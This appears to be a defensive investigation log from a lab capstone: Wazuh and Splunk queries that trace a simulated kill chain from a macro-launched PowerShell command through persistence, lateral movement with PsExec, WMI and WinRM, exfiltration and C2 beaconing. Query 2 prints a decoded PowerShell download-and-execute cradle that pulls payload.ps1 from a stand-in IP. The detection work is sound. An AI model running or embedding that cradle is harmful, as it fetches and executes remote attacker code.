# Investigation Queries: Capstone — Full Kill Chain

**Report ID**: INV-20261125-003
**All queries run during investigation (including dead ends)**

---

## Wazuh WQL / OpenSearch DSL Queries

### 1. Phishing / Initial Access (Macro → PowerShell)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "data.win.eventdata.parentImage": "*winword.exe" }},
        { "wildcard": { "data.win.eventdata.image": "*powershell.exe" }},
        { "wildcard": { "data.win.eventdata.commandLine": "*-enc*" }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:00:00Z", "lte": "2026-11-25T13:10:00Z" }}}
      ]
    }
  },
  "_source": ["@timestamp", "data.win.eventdata.image", "data.win.eventdata.commandLine", "data.win.eventdata.parentImage", "data.win.eventdata.processId"]
}
```

### 2. PowerShell Encoded Command Decoded
```bash
# Manual decode (run on Kali/Linux)
echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIzAC8AcABhAHkAbABvAGEAZAAuAHAFMQAnACkA" | base64 -d
# Output: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/payload.ps1')
```

### 3. Scheduled Task Creation (EventID 4698)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "term": { "rule.id": "92720" }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:03:00Z", "lte": "2026-11-25T13:06:00Z" }}}
      ]
    }
  },
  "_source": ["@timestamp", "data.win.eventdata.taskName", "data.win.eventdata.taskContent", "data.win.eventdata.targetUserName"]
}
```

### 4. Registry Run Key (EventID 13)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "data.win.eventdata.targetObject": "*\\Run" }},
        { "wildcard": { "data.win.eventdata.details": "*powershell*-enc*" }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:05:00Z", "lte": "2026-11-25T13:06:00Z" }}}
      ]
    }
  }
}
```

### 5. Discovery Commands (systeminfo, whoami, net)
```json
GET wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "terms": { "data.win.eventdata.image": ["systeminfo.exe", "whoami.exe", "net.exe", "net1.exe", "nmap.exe"] }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:10:00Z", "lte": "2026-11-25T13:20:00Z" }}}
      ]
    }
  }
}
```

### 6. Lateral Movement — SMB (PsExec)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "terms": { "data.win.eventdata.image": ["psexec.exe", "psexesvc.exe", "wmiexec.py", "smbexec.py"] }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:20:00Z", "lte": "2026-11-25T13:30:00Z" }}}
      ]
    }
  }
}
```

### 7. Service Creation on Remote Host (EventID 4697)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "term": { "data.win.eventdata.serviceName": "PSEXESVC" }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:20:00Z" }}}
      ]
    }
  }
}
```

### 8. WMI Lateral (wmiprvse.exe → cmd/powershell)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "data.win.eventdata.parentImage": "*wmiprvse.exe" }},
        { "terms": { "data.win.eventdata.image": ["cmd.exe", "powershell.exe"] }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:20:00Z", "lte": "2026-11-25T13:30:00Z" }}}
      ]
    }
  }
}
```

### 9. WinRM Lateral (wsmprovhost.exe → powershell)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "data.win.eventdata.parentImage": "*wsmprovhost.exe" }},
        { "wildcard": { "data.win.eventdata.image": "*powershell.exe" }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:20:00Z", "lte": "2026-11-25T13:30:00Z" }}}
      ]
    }
  }
}
```

### 10. Admin Share Access (EventID 5145)
```json
GET wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "terms": { "data.win.eventdata.shareName": ["C$", "ADMIN$", "IPC$"] }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:20:00Z", "lte": "2026-11-25T13:40:00Z" }}}
      ]
    }
  }
}
```

### 11. Data Staging & Archive (tar, copy)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "terms": { "data.win.eventdata.image": ["tar.exe", "copy.exe", "robocopy.exe", "xcopy.exe"] }},
        { "wildcard": { "data.win.eventdata.commandLine": "*staging*" }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:30:00Z", "lte": "2026-11-25T13:40:00Z" }}}
      ]
    }
  }
}
```

### 12. Exfiltration — HTTP POST (Suricata)
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "term": { "event_type": "http" }},
        { "term": { "http.http_method": "POST" }},
        { "term": { "destination.ip": "203.0.113.45" }},
        { "wildcard": { "url": "*exfil*" }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:40:00Z" }}}
      ]
    }
  }
}
```

### 13. C2 Beacon (HTTP GET)
```json
GET wazuh-alerts-*/_search
{
  "size": 200,
  "query": {
    "bool": {
      "must": [
        { "term": { "event_type": "http" }},
        { "term": { "http.http_method": "GET" }},
        { "term": { "destination.ip": "203.0.113.45" }},
        { "wildcard": { "url": "*beacon*" }},
        { "range": { "@timestamp": { "gte": "2026-11-25T13:40:00Z", "lte": "2026-11-25T16:00:00Z" }}}
      ]
    }
  },
  "aggs": {
    "intervals": {
      "date_histogram": {
        "field": "@timestamp",
        "fixed_interval": "1m"
      }
    }
  }
}
```

---

## Splunk SPL Equivalents

### Full Kill Chain Correlation (Conceptual)
```spl
# Start with phishing
index=winevents sourcetype=xmlwineventlog EventCode=4688
| where match(ParentProcess_Name, "winword.exe") AND match(New_Process_Name, "powershell.exe") AND match(Command_Line, "-enc")
| eval stage="initial_access", pid=ProcessId, host=host, _time=_time

# Join persistence
| join type=left pid, host, _time
    [ search index=winevents EventCode=4698
    | where match(Task_Content, "powershell.*-enc")
    | eval stage="persistence" ]

# Join lateral
| join type=left host, _time
    [ search index=winevents (EventCode=4697 Service_Name="PSEXESVC") OR (EventCode=4688 match(New_Process_Name, "(psexec|wmiexec|smbexec)"))
    | eval stage="lateral" ]

# Join exfil
| join type=left host, _time
    [ search index=winevents sourcetype=suricata event_type=http http_method=POST destination_ip=203.0.113.45
    | eval stage="exfil" ]

| where isnotnull(stage)
| stats values(stage) as kill_chain_stages by host, _time
| where mvcount(kill_chain_stages) >= 4
```

---

## Dead Ends

| Query | Reason |
|-------|--------|
| Kerberos AS-REP roasting (4768/4769) | No domain controller with users |
| DCSync (4662) | No domain controller |
| CloudTrail / Azure AD | Hybrid not in lab scope |

---

**All queries saved for reproducibility and interview walkthrough.**